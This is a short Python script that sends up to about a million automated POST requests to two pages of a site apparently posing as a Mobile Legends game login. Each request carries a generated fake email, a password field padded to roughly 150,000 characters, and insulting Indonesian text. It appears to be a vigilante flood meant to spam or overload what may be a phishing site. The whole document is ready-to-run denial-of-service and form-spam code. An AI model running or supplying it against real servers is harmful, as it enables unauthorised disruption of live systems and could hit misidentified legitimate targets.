import requests

url1 = 'https://game.mobilelegends.vn/'
url2 = 'https://game.mobilelegends.vn/verification.php'
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

for i in range(1, 999999):
    email1 = f'heybangr{i}@anjiing.com'
    email2 = f'heybangr{i}@anjiing.com'
    data1 = {'email': email2,
             'password': 'MAMPUUUUSSSSSa1'*10000,
             'login': 'Facebook',
             'userId': '6666666',
             'nickname': 'jangan gitu ya anjeng',
             'level': '8',
             'tier': 'Neraka waiting for you'}
    data2 = {'email': email1,
             'password': 'MAMPUUUUSSSSSa1'*10000,
             'login': 'Facebook'}

    if i % 2 == 0:
        response = requests.post(url1, headers=headers, data=data1)
        print(f"Request {i}:{email2}")
    else:
        response = requests.post(url2, headers=headers, data=data2)
        print(f"Request {i}:{email1}")
